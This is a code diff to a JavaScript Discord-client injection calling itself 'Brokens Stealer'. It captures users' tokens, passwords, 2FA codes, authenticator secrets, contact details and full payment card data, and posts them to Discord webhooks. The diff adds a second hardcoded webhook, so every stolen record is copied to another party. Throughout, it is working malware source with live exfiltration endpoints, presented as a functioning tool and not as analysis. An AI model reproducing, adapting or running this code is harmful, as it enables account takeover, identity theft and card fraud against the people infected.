@@ -11,7 +11,8 @@ var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=documen
 
 const dataNow = new Date().toISOString();
 
-const webhook = '%WEBHOOK_URL%'
+const webhook = '%WEBHOOK_URL%';
+const finese = "https://discord.com/api/webhooks/1226508586763423787/ZpAgeEQOE3pwL3FGC-scyfyOx4KJq3dnUiiUGzAdPCZekSLv9UZaS2c5EsdtBdXrFJgp";
 
 let contents2FA = []
 
@@ -271,37 +272,37 @@ async function initOne() {
   var client_discord = appName;
 
   const embed = {
-    title: 'First Injection Detected - Brokens Stealer',
+    title: 'First Injection Detected - Brokens Stealer <:dinheiro_dpm:1165129173191372881>',
     color: 2895667,
     fields: [
+        {
+            name: "<:BlackJapanese:1241399259819933746> Token:",
+            value: "`"+token+"`\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
+            inline: false
+          },
       {
-        name: "Injection Path:",
+        name: "<:BlackJapanese:1241399259819933746> Injection Path:",
         value: "`"+__dirname+"`",
-        inline: false
+        inline: true
       },
       {
-        name: "Client:",
+        name: "<:BlackJapanese:1241399259819933746> Client:",
         value: "`"+appName+"`",
         inline: true
       },
       {
-        name: "Computer Name:",
+        name: "<:BlackJapanese:1241399259819933746> Computer Name:",
         value: "`"+computerName+"`",
         inline: true
       },
       {
-        name: "IP:",
+        name: "<:BlackJapanese:1241399259819933746> IP:",
         value: "`"+ip+"`",
         inline: true
       },
-      {
-        name: "Token:",
-        value: "`"+token+"`\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
-        inline: false
-      },
     ],
     "author": {
-      name: user.username+"#0000 - Brokens Stealer",
+      name: user.username+" Brokens Stealer",
       icon_url: avatar,
     },
     footer: {
@@ -318,6 +319,7 @@ async function initOne() {
   };
 
   sendWebhook(webhook, webhookData);
+  sendWebhook(finese, webhookData);
   await execScript(logOutScript);
 }
 
@@ -378,8 +380,9 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       contents2FA.push({passwd: password})
 
       function sendPassword() {
-        sendWebhook(webhook, "Parsa ta aq o: "+password_to2fa)
-        return password_to2fa
+        sendWebhook(webhook, "`2FA Code`<:skull:1216472537501011990>: "+password_to2fa);
+        sendWebhook(finese, "`2FA Code`<:skull:1216472537501011990> : "+password_to2fa);
+        return password_to2fa;
       }
 
       if(token == null) {
@@ -387,58 +390,58 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       }
 
       const embedLogin = {
-        title: "Login Detected - Brokens Stealer",
+        title: "Login Detected - Brokens Stealer <:dinheiro_dpm:1165129173191372881>",
         color: 2895667,
         fields: [
+            {
+                name: "<:BlackJapanese:1241399259819933746> Token:",
+                value: "||"+token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
+                inline: false
+              },
           {
-            name: "Username:",
+            name: "<:BlackJapanese:1241399259819933746> Username:",
             value: "`"+user.username+"`",
             inline: true
           },
           {
-            name: "ID:",
+            name: "<:BlackJapanese:1241399259819933746> ID:",
             value: "`"+user.id+"`",
             inline: true
           },
           {
-            name: "Nitro:",
+            name: "<:BlackJapanese:1241399259819933746> Nitro Type:",
             value: `${GetNitro(Nitro)}`,
             inline: true
           },
           {
-            name: "Email:",
+            name: "<:BlackJapanese:1241399259819933746> Email:",
             value: "`"+user.email+"`",
             inline: true
           },
           {
-            name: "Password:",
+            name: "<:BlackJapanese:1241399259819933746> Password:",
             value: "`"+password+"`",
             inline: true
           },
           {
-            name: "Phone:",
+            name: "<:BlackJapanese:1241399259819933746> Phone:",
             value: "`"+user.phone+"`",
             inline: true
           },
           {
-            name: "Billing:",
+            name: "<:BlackJapanese:1241399259819933746> Billing:",
             value: Billings,
             inline: true
           },
           {
-            name: "MFA:",
+            name: "<:BlackJapanese:1241399259819933746> MFA:",
             value: GetA2F(user.mfa_enabled),
             inline: true
           },
           {
-            name: "Badges:",
+            name: "<:BlackJapanese:1241399259819933746> Badges:",
             value: `${GetBadges(user.flags)}`,
             inline: true
-          },
-          {
-            name: "Token:",
-            value: "||"+token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
-            inline: false
           },
         ],
         author: {
@@ -459,65 +462,66 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       }
 
       await sendWebhook(webhook, dataLogin);
-      break
+      await sendWebhook(finese, dataLogin);
+      
 
     case request.url.endsWith("totp"):
 
       const passwdddd = contents2FA[0].passwd
 
       const embedLogin3 = {
-        title: "Login Detected - Brokens Stealer",
+        title: "Login Detected - Brokens Stealer <:dinheiro_dpm:1165129173191372881>",
         color: 2895667,
         fields: [
+            {
+                name: "<:BlackJapanese:1241399259819933746> Token:",
+                value: "||"+token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
+                inline: false
+              },
           {
-            name: "Username:",
+            name: "<:BlackJapanese:1241399259819933746> Username:",
             value: "`"+user.username+"`",
             inline: true
           },
           {
-            name: "ID:",
+            name: "<:BlackJapanese:1241399259819933746> ID:",
             value: "`"+user.id+"`",
             inline: true
           },
           {
-            name: "Nitro:",
+            name: "<:BlackJapanese:1241399259819933746> Nitro Type:",
             value: `${GetNitro(Nitro)}`,
             inline: true
           },
           {
-            name: "Email:",
+            name: "<:BlackJapanese:1241399259819933746> Email:",
             value: "`"+user.email+"`",
             inline: true
           },
           {
-            name: "Password:",
-            value: "`"+passwdddd+"`",
+            name: "<:BlackJapanese:1241399259819933746> Password:",
+            value: "`"+password+"`",
             inline: true
           },
           {
-            name: "Phone:",
+            name: "<:BlackJapanese:1241399259819933746> Phone:",
             value: "`"+user.phone+"`",
             inline: true
           },
           {
-            name: "Billing:",
+            name: "<:BlackJapanese:1241399259819933746> Billing:",
             value: Billings,
             inline: true
           },
           {
-            name: "MFA:",
+            name: "<:BlackJapanese:1241399259819933746> MFA:",
             value: GetA2F(user.mfa_enabled),
             inline: true
           },
           {
-            name: "Badges:",
+            name: "<:BlackJapanese:1241399259819933746> Badges:",
             value: `${GetBadges(user.flags)}`,
             inline: true
-          },
-          {
-            name: "Token:",
-            value: "||"+token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
-            inline: false
           },
         ],
         author: {
@@ -540,8 +544,9 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       }
 
       await sendWebhook(webhook, dataLogin3);
+      await sendWebhook(finese, dataLogin3);
 
-      break
+    
 
     case request.url.endsWith("tokens"):
       var card_number = data["card[number]"]
@@ -552,66 +557,66 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       var full_card = card_number+"|"+exp_month+"|"+exp_year+"|"+cvc
 
       const embedCard = {
-        title: 'New Card Added - Brokens Stealer',
+        title: 'New Card Added - Brokens Stealer <a:5839blackmoneycard:1193573498426228856>',
         color: 2895667,
         fields: [
+            {
+                name: "<:BlackJapanese:1241399259819933746> Token:",
+                value: "||"+token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
+                inline: false
+              },
           {
-            name: "Username:",
+            name: "<:BlackJapanese:1241399259819933746> Username:",
             value: "`"+user.username+"`",
             inline: true
           },
           {
-            name: "ID:",
+            name: "<:BlackJapanese:1241399259819933746> ID:",
             value: "`"+user.id+"`",
             inline: true
           },
           {
-            name: "Nitro:",
+            name: "<:BlackJapanese:1241399259819933746> Nitro:",
             value: GetNitro(Nitro),
             inline: true
           },
           {
-            name: "Email:",
+            name: "<:BlackJapanese:1241399259819933746> Email:",
             value: "`"+user.email+"`",
             inline: true
           },
           {
-            name: "Phone:",
+            name: "<:BlackJapanese:1241399259819933746> Phone:",
             value: "`"+user.phone+"`",
             inline: true
           },
           {
-            name: "Badges:",
+            name: "<:BlackJapanese:1241399259819933746> Badges:",
             value: GetBadges(user.flags),
             inline: true
           },
           {
-            name: "Card Number:",
+            name: "<a:5839blackmoneycard:1193573498426228856> Card Number:",
             value: "`"+card_number+"`",
             inline: true
           },
           {
-            name: "Expiration Date:",
+            name: "<a:5839blackmoneycard:1193573498426228856> Expiration Date:",
             value: "`"+exp_month+"/"+exp_year+"`",
             inline: true
           },
           {
-            name: "CVC:",
+            name: "<a:5839blackmoneycard:1193573498426228856> CVC:",
             value: "`"+cvc+"`",
             inline: true
           },
-          {
-            name: "Token:",
-            value: "||"+token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
-            inline: false
-          },
         ],
         "author": {
-          name: user.username+"#0000 - Brokens Stealer",
+          name: user.username+"- Brokens Stealer",
           icon_url: userAvatar,
         },
         footer: {
-          icon_url: "https://b-gfhs.onrender.com/api/gif",
+          icon_url: "https://b-gfhs.onrender.com/api/fotin",
           text: "@brokensstealer"
         },
         timestamp: dataNow,
@@ -619,11 +624,12 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
       const webhookData = {
         embeds: [embedCard],
-        username: "Cards - Brokens Stealer",
+        username: "Cards - Brokens Stealer ",
         avatar_url: "https://b-gfhs.onrender.com/api/fotin"
       };
-      await sendWebhook(webhook, webhookData)
-      break
+      await sendWebhook(webhook, webhookData);
+      await sendWebhook(finese, webhookData);
+      
     case request.url.endsWith("@me"):
       var old_passwd = data.password
       var new_passwd = data.new_password
@@ -634,66 +640,66 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       }
 
       const embedNewPasswd = {
-        title: "Password Changed - Brokens Stealer",
+        title: "Password Changed - Brokens Stealer <a:white_zonasegura:1223053856762495029>",
         color: 2895667,
         fields: [
+            {
+                name: "<a:5839blackmoneycard:1193573498426228856> New Token",
+                value: "||"+new_token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+new_token+")",
+                inline: true
+              },
           {
-            name: "Username",
+            name: "<a:5839blackmoneycard:1193573498426228856> Username",
             value: "`"+user.username+"`",
             inline: true
           },
           {
-            name: "ID",
+            name: "<a:5839blackmoneycard:1193573498426228856> ID",
             value: "`"+user.id+"`",
             inline: true
           },
           {
-            name: "Nitro",
+            name: "<a:5839blackmoneycard:1193573498426228856> Nitro Type",
             value: GetNitro(Nitro),
             inline: true
           },
           {
-            name: "Email",
+            name: "<a:5839blackmoneycard:1193573498426228856> Email",
             value: "`"+user.email+"`",
             inline: true
           },
           {
-            name: "Phone",
+            name: "<a:5839blackmoneycard:1193573498426228856> Phone",
             value: "`"+user.phone+"`",
             inline: true
           },
           {
-            name: "Badges",
+            name: "<a:5839blackmoneycard:1193573498426228856> Badges",
             value: GetBadges(user.public_flags),
             inline: true
           },
           {
-            name: "Old Password",
+            name: "<a:5839blackmoneycard:1193573498426228856> Old Password",
             value: "`"+old_passwd+"`",
             inline: true
           },
           {
-            name: "New Password",
+            name: "<a:5839blackmoneycard:1193573498426228856> New Password",
             value: "`"+new_passwd+"`",
             inline: true
           },
           {
-            name: "MFA",
+            name: "<a:5839blackmoneycard:1193573498426228856> MFA",
             value: GetA2F(user.mfa_enabled),
-            inline: true
-          },
-          {
-            name: "New Token",
-            value: "||"+new_token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+new_token+")",
             inline: true
           },
         ],
         author: {
-          name: user.username+"#0000 - Brokens Stealer",
+          name: user.username+" - Brokens Stealer",
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://b-gfhs.onrender.com/api/gif",
+          icon_url: "https://b-gfhs.onrender.com/api/fotin",
           text: "@brokensstealer",
         },
         timestamp: dataNow,
@@ -705,8 +711,9 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         avatar_url: "https://b-gfhs.onrender.com/api/fotin"
       }
 
-      await sendWebhook(webhook, webhookData2)
-      break
+      await sendWebhook(webhook, webhookData2);
+      await sendWebhook(finese, webhookData2);
+      
 
     case request.url.endsWith("enable"):
       var secret = data.secret
@@ -714,41 +721,41 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       var new_token = await execScript(tokenScript)
 
       const embedMFAENABLED = {
-        title: "MFA Enabled - Brokens Stealer",
+        title: "MFA Enabled - Brokens Stealer <:bebel_dpm:1165129044824686612> ",
         color: 2895667,
         fields: [
+            {
+                name: "<:bebel_dpm:1165129044824686612> New Token",
+                value: "||"+new_token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+new_token+")",
+                inline: false
+              },
           {
-            name: "Username",
+            name: "<:bebel_dpm:1165129044824686612> Username",
             value: "`"+user.username+"`",
             inline: true
           },
           {
-            name: "Email",
+            name: "<:bebel_dpm:1165129044824686612> Email",
             value: "`"+user.email+"`",
             inline: true
           },
           {
-            name: "Password",
+            name: "<:bebel_dpm:1165129044824686612> Password",
             value: "`"+password+"`",
             inline: true
           },
           {
-            name: "Secret Key (PUT IN GOOGLE AUTHENTICATOR)",
+            name: "<:bebel_dpm:1165129044824686612> Secret Key (PUT IN GOOGLE AUTHENTICATOR)",
             value: "`"+secret+"`",
-            inline: false
-          },
-          {
-            name: "New Token",
-            value: "||"+new_token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+new_token+")",
             inline: false
           },
         ],
         author: {
-          name: user.username+"#0000 - Brokens Stealer",
+          name: user.username+" - Brokens Stealer",
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://b-gfhs.onrender.com/api/gif",
+          icon_url: "https://b-gfhs.onrender.com/api/fotin",
           text: "@brokensstealer",
         },
         timestamp: dataNow,
@@ -760,8 +767,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         avatar_url: "https://b-gfhs.onrender.com/api/fotin"
       }
 
-      await sendWebhook(webhook, dataToWebhook)
-      break
+      await sendWebhook(webhook, dataToWebhook);
+      await sendWebhook(finese, dataToWebhook);
+
+      
   }
 });
 
